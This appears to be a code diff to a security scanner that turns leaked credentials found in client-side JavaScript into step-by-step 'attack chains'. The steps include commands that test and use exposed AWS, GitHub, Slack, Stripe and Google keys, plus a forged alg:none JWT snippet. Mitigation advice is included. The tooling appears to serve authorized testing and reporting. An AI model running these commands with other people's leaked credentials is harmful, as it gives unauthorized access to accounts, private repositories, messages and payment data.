@@ -144,81 +144,168 @@ def detect_secret_exploitation(scan_data: dict[str, Any]) -> list[AttackChain]:
 
     for finding in findings:
         sev = finding.get("severity", "").lower()
-        if sev not in ("critical", "high"):
+        if sev not in ("critical", "high", "medium"):
             continue
         secret_type = finding.get("type", "unknown")
         file_path = finding.get("file", "")
-        matched = finding.get("match", "")[:50] + "..."
-        chain_id = f"chain-secret-{hashlib.md5(matched.encode()).hexdigest()[:8]}"
+        matched_raw = finding.get("match", "")
+        line_num = finding.get("line", "?")
+        # Show enough to identify but not the full secret
+        matched_preview = matched_raw[:40] + "..." if len(matched_raw) > 40 else matched_raw
+        chain_id = f"chain-secret-{hashlib.md5(matched_raw.encode()).hexdigest()[:8]}"
 
         steps = [
-            AttackStep(1, f"Extract the {secret_type} from source",
-                       f"# Found in: {file_path}", "grep",
-                       f"Secret type: {secret_type}"),
+            AttackStep(1, f"Locate the {secret_type} in source code",
+                       f"grep -n '{matched_raw[:20]}' {file_path}",
+                       "grep",
+                       f"Should find the secret at line {line_num}",
+                       f"Full match preview: {matched_preview}"),
         ]
 
-        if "aws" in secret_type.lower() or "akia" in matched.lower():
+        if "aws" in secret_type.lower() or "akia" in matched_raw.lower():
             steps.extend([
-                AttackStep(2, "Validate AWS credentials",
-                           "aws sts get-caller-identity", "aws-cli",
-                           "Returns account ID and ARN if valid"),
-                AttackStep(3, "Enumerate permissions",
-                           "aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)",
-                           "aws-cli", "Lists attached policies"),
-                AttackStep(4, "Check S3 access",
-                           "aws s3 ls", "aws-cli",
-                           "Lists accessible buckets"),
+                AttackStep(2, "Set up AWS credentials for testing",
+                           f"export AWS_ACCESS_KEY_ID='{matched_raw[:20]}...'\nexport AWS_SECRET_ACCESS_KEY='<find-the-secret-key-pair>'",
+                           "shell",
+                           "Environment variables set",
+                           "The secret key often lives near the access key in the same JS file"),
+                AttackStep(3, "Validate AWS credentials are live",
+                           "aws sts get-caller-identity --output json",
+                           "aws-cli",
+                           "Returns JSON with Account, Arn, UserId = KEY IS LIVE",
+                           "If you get 'InvalidClientTokenId' or 'SignatureDoesNotMatch' → key is dead/rotated"),
+                AttackStep(4, "Enumerate what this key can access",
+                           "aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) 2>/dev/null || echo 'No IAM perms'\naws s3 ls 2>/dev/null || echo 'No S3 access'\naws ec2 describe-instances --region us-east-1 2>/dev/null | head -20 || echo 'No EC2 access'",
+                           "aws-cli",
+                           "Any successful response = data exposure, report the scope"),
             ])
-        elif "jwt" in secret_type.lower() or "eyj" in matched.lower():
+        elif "jwt" in secret_type.lower() or "eyj" in matched_raw.lower()[:5]:
+            token_preview = matched_raw[:60]
             steps.extend([
-                AttackStep(2, "Decode JWT payload",
-                           "echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool",
-                           "base64", "Reveals claims: role, email, exp"),
-                AttackStep(3, "Test None algorithm attack",
-                           "# Modify header alg to 'none', remove signature",
-                           "jwt_tool", "If accepted, full auth bypass"),
-                AttackStep(4, "Brute-force weak secret",
-                           "hashcat -a 0 -m 16500 '<token>' wordlist.txt",
-                           "hashcat", "Cracks weak HMAC secrets"),
+                AttackStep(2, "Decode the JWT payload (no key needed)",
+                           f"echo '{token_preview}' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool",
+                           "base64",
+                           "JSON output showing claims: role, email, exp, iat, sub",
+                           "Check 'exp' field — if it's in the past, the token is expired. If 'role' contains 'admin', escalation risk is critical"),
+                AttackStep(3, "Check if the token is still accepted",
+                           f"curl -sI -H 'Authorization: Bearer {token_preview}...' https://<target-api>/api/me",
+                           "curl",
+                           "HTTP 200 = token is live; HTTP 401/403 = expired/revoked",
+                           "Replace <target-api> with the actual API domain found in the same JS file"),
+                AttackStep(4, "Try None algorithm bypass (if live)",
+                           "python3 -c \"\nimport base64, json\nheader = {'alg': 'none', 'typ': 'JWT'}\npayload = <decoded-payload-from-step-2>\ntoken = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'\nprint(token)\n\"",
+                           "python3",
+                           "If the forged token works → CRITICAL auth bypass"),
+            ])
+        elif "google" in secret_type.lower() or matched_raw.startswith("AIza"):
+            steps.extend([
+                AttackStep(2, "Test Google API key validity",
+                           f"curl -s 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={matched_raw[:40]}' | python3 -m json.tool",
+                           "curl",
+                           "status: 'OK' = key is live; 'REQUEST_DENIED' = restricted/dead",
+                           "Google API keys starting with 'AIza' are Maps/Cloud keys. Check which APIs are enabled"),
+                AttackStep(3, "Enumerate enabled Google APIs",
+                           f"# Try common Google API endpoints with the key:\ncurl -s 'https://www.googleapis.com/customsearch/v1?key={matched_raw[:40]}&q=test' | head -5\ncurl -s 'https://translation.googleapis.com/language/translate/v2?key={matched_raw[:40]}&q=hello&target=es' | head -5",
+                           "curl",
+                           "Any 200 response = that API is billable to the key owner"),
+            ])
+        elif "github" in secret_type.lower() or matched_raw.startswith(("ghp_", "gho_", "ghu_", "ghs_")):
+            steps.extend([
+                AttackStep(2, "Validate GitHub token and check scope",
+                           f"curl -sH 'Authorization: token {matched_raw[:40]}...' https://api.github.com/user -I | grep -E '(x-oauth-scopes|Status)'",
+                           "curl",
+                           "x-oauth-scopes header shows permissions; Status: 200 = live token",
+                           "ghp_ = personal access token, gho_ = OAuth, ghu_ = user-to-server, ghs_ = server-to-server"),
+                AttackStep(3, "List accessible repos (if token is live)",
+                           f"curl -sH 'Authorization: token {matched_raw[:40]}...' https://api.github.com/user/repos?per_page=5 | python3 -c \"import json,sys; [print(r['full_name'], r['private']) for r in json.load(sys.stdin)]\"",
+                           "curl",
+                           "Private repos visible = CRITICAL data exposure"),
+            ])
+        elif "slack" in secret_type.lower() or matched_raw.startswith("xox"):
+            steps.extend([
+                AttackStep(2, "Validate Slack token",
+                           f"curl -s 'https://slack.com/api/auth.test' -H 'Authorization: Bearer {matched_raw[:40]}...' | python3 -m json.tool",
+                           "curl",
+                           "ok: true = live token, shows team and user info",
+                           "xoxb = bot token, xoxp = user token (more dangerous), xoxs = session token"),
+                AttackStep(3, "List accessible channels",
+                           f"curl -s 'https://slack.com/api/conversations.list?limit=5' -H 'Authorization: Bearer {matched_raw[:40]}...' | python3 -c \"import json,sys; d=json.load(sys.stdin); [print(c['name']) for c in d.get('channels',[])]\"",
+                           "curl",
+                           "Channel names visible = can read messages, potential data leak"),
+            ])
+        elif "stripe" in secret_type.lower() or matched_raw.startswith(("sk_live_", "sk_test_", "pk_live_")):
+            is_secret = matched_raw.startswith("sk_")
+            steps.extend([
+                AttackStep(2, f"Test {'secret' if is_secret else 'publishable'} Stripe key",
+                           f"curl -s https://api.stripe.com/v1/charges?limit=1 -u '{matched_raw[:40]}...:' | python3 -m json.tool | head -20",
+                           "curl",
+                           "JSON response with charge data = CRITICAL financial exposure" if is_secret else "Publishable keys have limited access — check if secret key is nearby",
+                           "sk_live_ keys can charge cards and read all data. sk_test_ keys access test mode only — lower severity"),
             ])
         elif "api" in secret_type.lower() or "key" in secret_type.lower():
             steps.extend([
-                AttackStep(2, "Identify the service",
-                           "# Google the key prefix to determine the API provider",
-                           "browser", "e.g., AIza* = Google, sk_live_* = Stripe"),
-                AttackStep(3, "Test key validity",
-                           "# Make an API call with the discovered key",
-                           "curl", "200 OK = key is live"),
-                AttackStep(4, "Enumerate accessible resources",
-                           "# List what the key can access",
-                           "curl", "Check for data access, admin endpoints"),
+                AttackStep(2, "Identify the API service from key format",
+                           f"# Key preview: {matched_preview}\n# Check key prefix patterns:\n#   AIza*        → Google Cloud/Maps\n#   sk_live_*    → Stripe\n#   ghp_*        → GitHub\n#   xox*         → Slack\n#   AKIA*        → AWS\n#   SG.*         → SendGrid\n#   key-*        → Mailgun\n# Google the first 10 chars if unknown",
+                           "browser",
+                           "Identified service name and API docs",
+                           "Many API keys have distinct prefixes — match against known patterns"),
+                AttackStep(3, "Test key validity against identified service",
+                           f"# Replace <API_ENDPOINT> with the service's test endpoint:\ncurl -sI -H 'Authorization: Bearer {matched_raw[:30]}...' https://<API_ENDPOINT>/v1/me\n# OR:\ncurl -s 'https://<API_ENDPOINT>/v1/test?api_key={matched_raw[:30]}...'",
+                           "curl",
+                           "HTTP 200 = key is live; HTTP 401/403 = invalid or revoked"),
+                AttackStep(4, "Determine access scope and impact",
+                           "# Once authenticated, try:\n# 1. List resources: GET /v1/resources\n# 2. Read data: GET /v1/users or /v1/data\n# 3. Write test: POST /v1/test (only if authorized!)",
+                           "curl",
+                           "Any data returned = report with the scope of access"),
             ])
         else:
-            steps.append(
-                AttackStep(2, "Validate the credential",
-                           "# Test the discovered credential against the service",
-                           "curl", "Confirm it's live and determine scope"),
-            )
+            steps.extend([
+                AttackStep(2, "Determine what type of secret this is",
+                           f"# Examine the context around the match in {file_path}:\ngrep -B5 -A5 '{matched_raw[:15]}' {file_path}\n# Look for variable names, comments, API URLs nearby",
+                           "grep",
+                           "Context reveals the service/purpose of the secret",
+                           "Common patterns: passwords in config, tokens in auth headers, keys in API calls"),
+                AttackStep(3, "Test if the secret is live",
+                           "# Based on context from step 2, try authenticating:\n# If it's a password: try logging into the associated service\n# If it's a token: curl with Authorization header\n# If it's an API key: try the associated API endpoint",
+                           "curl",
+                           "Successful authentication = CONFIRMED, report it",
+                           "If the value looks like 'test', 'example', 'changeme', 'xxx' → it's a placeholder, skip"),
+            ])
 
         chains.append(AttackChain(
             id=chain_id,
-            title=f"Exposed {secret_type} -> Potential Account Takeover",
+            title=f"Exposed {secret_type} → Potential Account Takeover",
             severity=sev,
-            confidence=0.7,
+            confidence=0.7 if sev == "high" else 0.5,
             category="credential_exposure",
             description=(
-                f"A {secret_type} was found exposed in {file_path}. "
-                f"If this credential is live, an attacker can use it to "
-                f"access the associated service, potentially leading to "
-                f"data exfiltration or full account takeover."
+                f"A **{secret_type}** was discovered in `{file_path}` (line {line_num}). "
+                f"Match preview: `{matched_preview}`. "
+                f"If this credential is live and unrestricted, an attacker can use it to "
+                f"access the associated service — potentially leading to data exfiltration, "
+                f"unauthorized actions, or full account takeover. Follow the validation steps "
+                f"below to determine if this is a real exploitable finding or just informational noise."
             ),
             target_host=file_path,
             affected_assets=[file_path],
-            prerequisites=[f"Exposed {secret_type} in client-side code"],
+            prerequisites=[
+                f"Exposed {secret_type} found in client-side JavaScript",
+                f"File: {file_path} (line {line_num})",
+                f"The secret must be live (not rotated/revoked) to be exploitable",
+            ],
             steps=steps,
-            tools_needed=["curl", "grep", "browser"],
-            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
-            mitigation=f"Rotate the {secret_type} immediately. Move secrets to server-side environment variables.",
+            tools_needed=["curl", "grep", "browser", "python3"],
+            references=[
+                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage",
+                "https://github.com/streaak/keyhacks",
+            ],
+            mitigation=(
+                f"1. **Immediately rotate** the {secret_type} — generate a new one and revoke the old\n"
+                f"2. **Move secrets server-side** — never embed API keys in client-side JavaScript\n"
+                f"3. **Use environment variables** or a secrets manager (Vault, AWS Secrets Manager)\n"
+                f"4. **Add key restrictions** — limit by IP, referrer, or API scope where possible\n"
+                f"5. **Audit access logs** — check if the leaked key was used by unauthorized parties"
+            ),
             evidence=finding,
         ))
     return chains
